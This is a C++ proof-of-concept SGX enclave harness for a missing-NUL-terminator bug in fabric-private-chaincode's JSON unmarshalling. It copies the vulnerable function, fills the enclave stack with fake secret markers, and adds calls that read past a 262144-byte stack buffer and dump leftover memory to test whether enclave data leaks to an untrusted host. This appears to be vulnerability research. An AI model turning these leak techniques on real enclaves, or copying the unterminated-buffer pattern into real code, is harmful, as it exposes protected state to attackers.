/*
 * SGX simulation-mode PoC: does the fabric-private-chaincode parson
 * missing-null-terminator bug (unmarshal_values() in shim.cpp calling
 * json_parse_string() on a host-filled, non-guaranteed-terminated
 * 262144-byte buffer) crash cleanly, or can it read adjacent enclave
 * stack memory left over from prior enclave activity and surface it
 * back to the (untrusted) caller as parsed JSON key/value content?
 *
 * unmarshal_values() below is copied VERBATIM from the real
 * fabric-private-chaincode source (ecc_enclave/enclave/shim.cpp,
 * commit checked out in /tmp/fpc3), unmodified. parson.c/parson.h and
 * base64.cpp/base64.h are the real, unmodified upstream sources
 * (compiled via the real SGX enclave toolchain, same StackMaxSize
 * 0x80000 as the real enclave.config.xml). Only the ECALL glue,
 * plant_secret()/vulnerable_call() harness, and the loggingf() stub
 * (never reached before the crash point) are new.
 */

#include <cstdint>
#include <cstring>
#include <cstdio>
#include <map>
#include <string>

#include "parson.h"
#include "base64.h"
#include "Enclave_t.h"

extern "C" int loggingf(const char* fmt, ...)
{
    (void)fmt;
    return 1;
}

#define COND2ERR(b)     \
    do {                \
        if (b) goto err; \
    } while (0)

// ---- verbatim copy of shim.cpp:unmarshal_values ----
static int unmarshal_values(
    std::map<std::string, std::string>& values, const char* json_bytes, uint32_t json_len)
{
    JSON_Value* root = json_parse_string(json_bytes);
    if (json_value_get_type(root) != JSONArray)
    {
        return -1;
    }

    JSON_Array* pairs = json_value_get_array(root);
    COND2ERR(pairs == NULL);

    for (int i = 0; i < json_array_get_count(pairs); i++)
    {
        JSON_Object* pair = json_array_get_object(pairs, i);
        const char* key = json_object_get_string(pair, "key");
        if (key == NULL)
        {
            return -1;
        }
        const char* b64value = json_object_get_string(pair, "value");
        if (b64value == NULL)
        {
            return -1;
        }
        std::string value = base64_decode(b64value);
        values.insert({key, value});
    }
    json_value_free(root);
    return 1;

err:
    return -1;
}
// ---- end verbatim copy ----

#define SECRET_MARKER "\"LEAK_MARKER_KEY\":\"TOP_SECRET_ENCLAVE_STATE_0123456789abcdef_TOP_SECRET\","

// Dirties a wide range of enclave stack memory with a recognizable,
// non-zero, JSON-ish marker string -- standing in for the real
// leftover stack content that a long-running enclave accumulates
// from prior legitimate transactions (decrypted state values, keys,
// etc.) sitting in the very same stack region that shim.cpp's
// get_public_state_by_partial_composite_key() later reuses for its
// 262144-byte json[] buffer.
__attribute__((noinline)) static void plant_secret(int depth)
{
    volatile char buf[16384];
    const char* marker = SECRET_MARKER;
    size_t mlen = strlen(marker);
    for (size_t i = 0; i < sizeof(buf); i++)
    {
        buf[i] = marker[i % mlen];
    }
    // touch buf so the compiler can't prove it's dead and elide the writes
    asm volatile("" : : "r"(buf[0]), "r"(buf[sizeof(buf) - 1]) : "memory");

    if (depth > 0)
    {
        plant_secret(depth - 1);
    }
}

// Exact replica of the vulnerable pattern in
// shim.cpp:get_public_state_by_partial_composite_key(): a fixed
// 262144-byte LOCAL (stack) buffer, filled with exactly `payload_len`
// attacker bytes (as a malicious host would via the ocall), with the
// remainder of the buffer left untouched -- i.e. whatever was already
// on the enclave stack -- then handed to unmarshal_values() with no
// guarantee of a NUL terminator, exactly as the real code does.
static uintptr_t g_diag_json_addr = 0;

__attribute__((noinline)) static int vulnerable_call(
    const uint8_t* payload, uint32_t payload_len, std::map<std::string, std::string>& values)
{
    uint8_t json[262144];  // same size, same comment as real shim.cpp
    uint32_t len = payload_len < sizeof(json) ? payload_len : (uint32_t)sizeof(json);
    memcpy(json, payload, len);
    // NOTE: the rest of json[len..262143] is intentionally left
    // untouched, exactly like the real code -- that's the bug.
    g_diag_json_addr = (uintptr_t)json;

    return unmarshal_values(values, (const char*)json, len);
}

__attribute__((noinline)) static void probe_from(uint8_t* json)
{
    char msg[128];
    // Read forward in small steps, checkpointing progress to the host
    // after each step. If the enclave crashes, the LAST printed
    // checkpoint tells us exactly how far past json[262144) reads
    // stayed within mapped enclave memory before the fault.
    for (int off = 0; off <= 65536; off += 256)
    {
        volatile uint8_t v = json[262144 + off];
        (void)v;
        snprintf(msg, sizeof(msg), "read OK at json[262144+%d] = 0x%02x", off, (unsigned)v);
        ocall_checkpoint(msg);
    }
}

__attribute__((noinline)) static void probe_vulnerable_frame()
{
    uint8_t json[262144];
    memset(json, 'A', sizeof(json));  // touch the whole declared buffer first
    probe_from(json);
}

void ecall_probe_bounds()
{
    plant_secret(24);
    probe_vulnerable_frame();
}

void ecall_run_leak_test(const uint8_t* payload, uint32_t payload_len, char* out, uint32_t out_cap,
    uint32_t* out_used, int* unmarshal_status)
{
    // 1. Dirty a wide swath of enclave stack (well beyond the
    //    262144-byte buffer we're about to allocate) with a
    //    recognizable non-zero marker, simulating a long-running
    //    enclave's accumulated stack history.
    plant_secret(24);  // ~24 * 16KB = ~384KB of stack dirtied

    // 2. Run the real vulnerable code path on attacker-controlled,
    //    non-terminated input.
    std::map<std::string, std::string> values;
    int status = vulnerable_call(payload, payload_len, values);
    *unmarshal_status = status;

    // 3. Report back whatever unmarshal_values() managed to produce,
    //    whether it "succeeded" or not (partial inserts survive a
    //    later error return) -- if we get here at all, the enclave
    //    did NOT crash.
    uint32_t used = 0;
    {
        int n = snprintf(out + used, used < out_cap ? out_cap - used : 0,
            "json[] stack addr=%p\n", (void*)g_diag_json_addr);
        if (n > 0) used += (uint32_t)n;
    }
    for (auto& kv : values)
    {
        int n = snprintf(out + used, used < out_cap ? out_cap - used : 0, "KV[%s]=[%s]\n",
            kv.first.c_str(), kv.second.c_str());
        if (n < 0) break;
        used += (uint32_t)n;
        if (used >= out_cap) { used = out_cap; break; }
    }
    *out_used = used;
}

// Ground-truth dump: exactly replicates vulnerable_call()'s buffer
// setup (fresh uninitialized 262144-byte stack array, attacker bytes
// memcpy'd into [0, payload_len), rest left as whatever the enclave
// stack already had) and copies out_cap raw bytes starting right at
// json[payload_len] -- i.e. precisely the leftover region parson's
// unbounded scan would read over in the real bug -- back to the host,
// with NO JSON parsing involved. This tells us definitively whether
// the plant_secret() marker (or any recognizable enclave data) is
// actually sitting there, independent of how parson's scan happens to
// behave on any particular payload.
__attribute__((noinline)) static void dump_raw_call(
    const uint8_t* payload, uint32_t payload_len, uint8_t* out, uint32_t out_cap)
{
    uint8_t json[262144];
    uint32_t len = payload_len < sizeof(json) ? payload_len : (uint32_t)sizeof(json);
    memcpy(json, payload, len);
    uint32_t avail = (uint32_t)sizeof(json) - len;
    uint32_t n = out_cap < avail ? out_cap : avail;
    memcpy(out, json + len, n);
    if (n < out_cap)
    {
        memset(out + n, 0xEE, out_cap - n);
    }
}

void ecall_dump_raw(const uint8_t* payload, uint32_t payload_len, uint8_t* out, uint32_t out_cap)
{
    plant_secret(24);
    dump_raw_call(payload, payload_len, out, out_cap);
}

// ---- escalation test: does a full successful parse (status==1) ever
// carry leaked bytes all the way back across the enclave boundary? ----
//
// SECRET_MARKER above never contains '}' or ']', so json_parse_string()
// can never find a legal top-level closer once the scan runs into it --
// every attempt either hits a NUL first (clean fail) or runs off mapped
// memory (crash). That is a property of *our own synthetic marker*, not
// proof leakage is impossible: real enclave stack residue (serialized
// protobuf/JSON, decrypted state values from prior transactions) is far
// more likely to contain stray '}'/']'/'"' bytes that could accidentally
// close out a malformed scan. MARKER2 below simulates that by using a
// SINGLE self-closing cycle -- a complete, valid array-of-one-object
// followed immediately by ']' -- planted repeatedly so alignment is easy
// to hit. If parson finds this, json_parse_string() only needs to reach
// the first ']' to consider the top-level array complete (trailing bytes
// after are simply ignored), so this does not require the entire rest of
// stack memory to be well-formed -- just the one cycle.
#define SECRET_MARKER2 "{\"key\":\"LEAKED_TOP_SECRET_ENCLAVE_STATE_0123456789abcdef\",\"value\":\"AAAA\"}]"

__attribute__((noinline)) static void plant_secret2(int depth)
{
    volatile char buf[16384];
    const char* marker = SECRET_MARKER2;
    size_t mlen = strlen(marker);
    for (size_t i = 0; i < sizeof(buf); i++)
    {
        buf[i] = marker[i % mlen];
    }
    asm volatile("" : : "r"(buf[0]), "r"(buf[sizeof(buf) - 1]) : "memory");

    if (depth > 0)
    {
        plant_secret2(depth - 1);
    }
}

void ecall_dump_raw2(const uint8_t* payload, uint32_t payload_len, uint8_t* out, uint32_t out_cap)
{
    plant_secret2(24);
    dump_raw_call(payload, payload_len, out, out_cap);
}

void ecall_run_leak_test2(const uint8_t* payload, uint32_t payload_len, char* out, uint32_t out_cap,
    uint32_t* out_used, int* unmarshal_status)
{
    plant_secret2(24);

    std::map<std::string, std::string> values;
    int status = vulnerable_call(payload, payload_len, values);
    *unmarshal_status = status;

    uint32_t used = 0;
    for (auto& kv : values)
    {
        int n = snprintf(out + used, used < out_cap ? out_cap - used : 0, "KV[%s]=[%s]\n",
            kv.first.c_str(), kv.second.c_str());
        if (n < 0) break;
        used += (uint32_t)n;
        if (used >= out_cap) { used = out_cap; break; }
    }
    *out_used = used;
}
